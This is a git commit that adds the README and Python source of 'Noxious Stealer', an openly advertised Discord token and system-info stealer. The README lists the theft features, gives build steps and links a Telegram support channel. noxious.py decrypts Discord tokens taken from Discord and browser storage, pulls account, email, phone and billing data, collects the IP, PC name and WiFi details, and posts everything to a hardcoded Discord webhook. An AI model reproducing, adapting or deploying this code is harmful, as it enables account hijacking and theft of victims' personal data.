cc43790a4c8026c8b970d1b5973b2b07214ac50b
Veal <86266617+realveal@users.noreply.github.com>
2024-03-05 17:00:29 +0000

    Add files via upload

---
+++ README.md
@@ -0,0 +1,69 @@
+Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/+HyVCbHaErR1lYTlk">Telegram</a>
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+<div align="center">
+  <h3>⭐ if you like Noxious Stealer<br></h3>
+</div>
+
+## Table
+:orange_circle: // Working On it
+:red_circle: // Not Done
+:green_circle: // Done
+
+
+## Features
+
+-   Discord token info
+    -   🟢 Nitro
+    -   🟢 Billing
+    -   🟢 Email
+    -   🟢 Phone
+    -   :orange_circle: Injection
+    -   🟢 All Tokens
+    -   🟢 Kill Discord
+    
+-   System info
+    -   🟢 User
+    -   🟢 WiFi
+    -   :orange_circle: Screenshot
+
+-    IP INFO
+     - 🟢 IP lookup
+     - 🟢 City
+     - 🟢 org
+     - 🟢 ect    
+
+
+## External Features To Add
+-    Things to come
+    - :orange_circle: Obfuscation ( Coming Soon )
+    - :red_circle:Browser Stealing
+    - :orange_circle: Self Destruct 
+
+-    IP INFO
+     - IP lookup
+     - City
+     - org
+     - ect
+
+### Prerequisites
+
+-   Windows 10/11
+-   [Python](https://www.python.org/downloads/release/python-390/)
+-   [Git](https://git-scm.com/download/win)
+
+### Setup
+
+1. open Builder.py with the following command "python builder.py" and follow the inputs given
+2. After everything and its finished compiling goto the dir called 'dist' and the executable compiled should be thier
+9. https://t.me/+HyVCbHaErR1lYTlk
+
+<div align="center">
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="assets/image.png"></img>
+</div>
+
+<img src="https://i.imgur.com/KDriHPw.png">
+<img src="https://i.imgur.com/mdJhwZD.png">
+
+
+-   Any Bugs Please Join the [Tele](https://t.me/+HyVCbHaErR1lYTlk)
+-   Join the [Discord](https://discord.gg/fUeh4NhT)
---
+++ noxious.py
@@ -0,0 +1,181 @@
+import requests
+import json
+import os
+import subprocess
+
+from datetime           import datetime
+from base64             import b64decode
+from Crypto.Cipher      import AES
+from win32crypt         import CryptUnprotectData
+from os                 import getlogin, listdir, getenv
+from json               import loads
+from re                 import findall
+from urllib.request     import Request, urlopen
+from subprocess         import Popen, PIPE
+
+# Todo List 
+# - Browser Stealing (Passwords / cookies)
+# - Self Destruct (working on it now)
+# - Obfuscation (Coming Soon)
+
+
+def wif():
+    try:
+        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
+        if result.returncode == 0:
+            return result.stdout
+        else:
+            return "Error: Unable to retrieve Wi-Fi information."
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def decrypt(buff, master_key):
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        return "Error"
+
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except: pass
+    return ip
+
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+def get_token():
+    already_check = []
+    checker = []
+    cleaned = []
+    tokens = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome = local + "\\Google\\Chrome\\User Data"
+    paths = {
+        'Discord': roaming + '\\discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Lightcord': roaming + '\\Lightcord',
+        'Discord PTB': roaming + '\\discordptb',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
+        '7Star': local + '\\7Star\\7Star\\User Data',
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome + 'Default',
+        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local + '\\Iridium\\User Data\\Default'
+    }
+
+    for platform, path in paths.items():
+        if not os.path.exists(path): continue
+        try:
+            with open(path + f"\\Local State", "r") as file:
+                key = loads(file.read())['os_crypt']['encrypted_key']
+                file.close()
+        except: continue
+        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+            if not file.endswith(".ldb") and file.endswith(".log"): continue
+            else:
+                try:
+                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError: continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            try:
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            except IndexError == "Error": continue
+            checker.append(tok)
+            for value in checker:
+                if value not in already_check:
+                    already_check.append(value)
+                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
+                    try:
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                    except: continue
+                    if res.status_code == 200:
+                        res_json = res.json()
+                        ip = getip()
+                        pc_username = getenv("UserName")
+                        pc_name = getenv("COMPUTERNAME")
+                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                        user_id = res_json['id']
+                        email = res_json['email']
+                        phone = res_json['phone']
+                        mfa_enabled = res_json['mfa_enabled']
+                        has_nitro = False
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                        nitro_data = res.json()
+                        has_nitro = bool(len(nitro_data) > 0)
+                        days_left = 0
+                        if has_nitro:
+                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            days_left = abs((d2 - d1).days)
+                        embed = {
+                            "title": user_name,
+                            "color": 0x000000,
+                            "author": {
+                                "name": "Noxious v1 - Made by veal1",
+                                "icon_url": "https://imgur.com/a/WKgRuYj"
+                            },
+                            "footer": {
+                                "text": "Dev Veal | https://github.com/realveal"
+                            },
+                            "fields": [
+                                {"name": "User ID", "value": user_id, "inline": True},
+                                {"name": "Account Information", "value": f"<a:blackdiamond:856110506670161930> Email: `{email}`\n<a:blackdiamond:856110506670161930> Phone: `{phone}`\n<a:blackdiamond:856110506670161930> 2FA/MFA Enabled: `{mfa_enabled}`\n<a:blackdiamond:856110506670161930> Nitro: `{has_nitro}`\n<a:blackdiamond:856110506670161930> Expires in: `{days_left if days_left else 'None'} day(s)`", "inline": False},
+                                {"name": "PC Information", "value": f"<a:blackdiamond:856110506670161930> IP: `{ip}`\n<a:blackdiamond:856110506670161930> Username: `{pc_username}`\n<a:blackdiamond:856110506670161930> PC Name: `{pc_name}`\n<a:blackdiamond:856110506670161930> Platform: `{platform}`", "inline": False},
+                                {"name": "Token", "value": f"||{tok}||", "inline": False}
+                            ]
+                        }
+                        payload = {
+                            "embeds": [embed]
+                        }
+                        try:
+                            res = requests.post('https://discord.com/api/webhooks/1193554886948831405/M4jdGGzw5udNbiri5GOXd4hfkpplfIeh8UlEFcQ_zyPmlLZnKRiBW7GMf9VkHK3JU2-T', json=payload, headers=headers)
+                            if res.status_code == 204:
+                                pass
+                        except Exception as e:
+                            pass
+                else: continue
+    
+    # Send Wi-Fi info
+    wifi_info = wif()
+    wifi_embed = {
+        "title": "**Wi-Fi Information**",
+        "color": 0x000000,
+        "fields": [
+            {"name": "Wi-Fi Info", "value": f"```js{wifi_info}```", "inline": False}
+        ]
+    }
+    wifi_payload = {
+        "embeds": [wifi_embed]
+    }
+    wifi_res = requests.post('https://discord.com/api/webhooks/1193554886948831405/M4jdGGzw5udNbiri5GOXd4hfkpplfIeh8UlEFcQ_zyPmlLZnKRiBW7GMf9VkHK3JU2-T', json=wifi_payload)
+    if wifi_res.status_code == 204:
+        pass
+
+if __name__ == '__main__':
+    get_token()
